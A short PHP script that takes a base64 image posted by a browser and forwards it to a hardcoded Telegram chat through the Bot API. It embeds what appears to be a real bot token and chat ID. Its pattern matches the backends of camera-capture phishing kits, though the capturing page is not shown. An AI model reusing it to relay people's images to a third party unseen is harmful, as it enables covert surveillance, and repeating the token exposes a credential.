<?php
// Telegram Bot Token and Chat ID
$telegramBotToken = "6924657045:AAFLN_b93lUX0dI_8bUd2qLHvfc7mBCw4gI"; // अपने टेलीग्राम बॉट का टोकन डालें
$chatId = "5067818918"; // अपने टेलीग्राम चैट आईडी डालें

// Decode incoming POST request
$data = json_decode(file_get_contents("php://input"), true);

// Extract the base64 image
$imageData = $data['image'];

// Remove the "data:image/png;base64," part from the string
$imageData = str_replace('data:image/png;base64,', '', $imageData);
$imageData = str_replace(' ', '+', $imageData);

// Decode the image data
$image = base64_decode($imageData);

// Create a temporary file to store the image
$tempFilePath = 'photo_' . time() . '.png';
file_put_contents($tempFilePath, $image);

// Send the photo to Telegram
$telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendPhoto";

// Prepare the data to send to the Telegram API
$postFields = array(
    'chat_id' => $chatId,
    'photo' => new CURLFile($tempFilePath)
);

// Initialize cURL to send the photo
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute cURL request
$response = curl_exec($ch);

// Close cURL session
curl_close($ch);

// Remove the temporary image file
unlink($tempFilePath);

// Send response back to the browser
echo "Photo sent successfully!";
?>
